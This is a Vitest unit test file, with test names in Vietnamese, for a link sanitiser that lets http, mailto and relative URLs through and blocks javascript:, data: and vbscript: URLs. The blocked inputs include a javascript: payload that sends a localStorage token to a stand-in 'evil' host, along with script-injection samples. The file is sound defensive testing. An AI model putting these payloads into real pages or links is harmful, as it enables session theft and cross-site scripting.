import { describe, it, expect } from 'vitest';
import { safeHref, laLienKetAnToan } from './safeUrl';

describe('safeHref', () => {
  it('cho qua http/https', () => {
    expect(safeHref('https://vietinbank.vn/tai-lieu.pdf')).toBe('https://vietinbank.vn/tai-lieu.pdf');
    expect(safeHref('http://noibo.local/bang-chung')).toBe('http://noibo.local/bang-chung');
  });

  it('cho qua mailto và đường dẫn tương đối', () => {
    expect(safeHref('mailto:cn343@example.com')).toBe('mailto:cn343@example.com');
    expect(safeHref('/ho-so/bang-chung.png')).toBe('/ho-so/bang-chung.png');
  });

  it('CHẶN javascript: (đường đánh cắp phiên đăng nhập)', () => {
    expect(safeHref("javascript:fetch('https://evil/?t='+localStorage.getItem('x'))")).toBeUndefined();
    expect(safeHref('JaVaScRiPt:alert(1)')).toBeUndefined();
    expect(safeHref('  javascript:alert(1)  ')).toBeUndefined();
  });

  it('CHẶN data: và vbscript:', () => {
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeUndefined();
    expect(safeHref('vbscript:msgbox(1)')).toBeUndefined();
  });

  it('trả undefined khi rỗng hoặc là mô tả ngắn, không phải link', () => {
    expect(safeHref('')).toBeUndefined();
    expect(safeHref(null)).toBeUndefined();
    expect(safeHref(undefined)).toBeUndefined();
  });

  it('laLienKetAnToan phản ánh đúng safeHref', () => {
    expect(laLienKetAnToan('https://a.vn')).toBe(true);
    expect(laLienKetAnToan('javascript:alert(1)')).toBe(false);
  });
});
